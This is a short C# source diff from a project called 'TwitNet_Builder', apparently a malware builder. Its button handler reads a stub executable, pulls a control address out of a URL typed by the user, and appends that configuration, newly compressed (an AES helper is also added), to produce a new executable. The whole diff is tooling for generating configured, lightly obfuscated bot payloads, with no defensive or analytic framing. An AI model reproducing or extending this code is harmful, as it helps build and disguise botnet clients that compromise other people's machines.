@@ -20,6 +20,8 @@ namespace TwitNet_Builder
 
         private void button1_Click(object sender, EventArgs e)
         {
+            SimpleAES AES = new SimpleAES();
+
             SaveDialog.Filter = "Exe File(*.exe)|*.exe";
             SaveDialog.InitialDirectory = Application.StartupPath;
             SaveDialog.Title = "Save As...";
@@ -27,12 +29,12 @@ namespace TwitNet_Builder
 
             byte[] stub = File.ReadAllBytes("stub.exe");
 
-            string AppendData = Util.Splitter + Regex.Split(textBox1.Text, ".com/")[1];
+            string AppendData = Util.Splitter + Regex.Split(textBox1.Text, "http://")[1].Split('.')[0];
             
             StreamWriter writer = new StreamWriter(SaveDialog.FileName, false, Encoding.Default);
             writer.AutoFlush = true;
             writer.Write(Encoding.Default.GetString(stub));
-            writer.Write(AppendData);
+            writer.Write(Encoding.Default.GetString(GZip.CompressData(Encoding.Default.GetBytes(AppendData))));
             writer.Close();
             MessageBox.Show("Completed");
         }
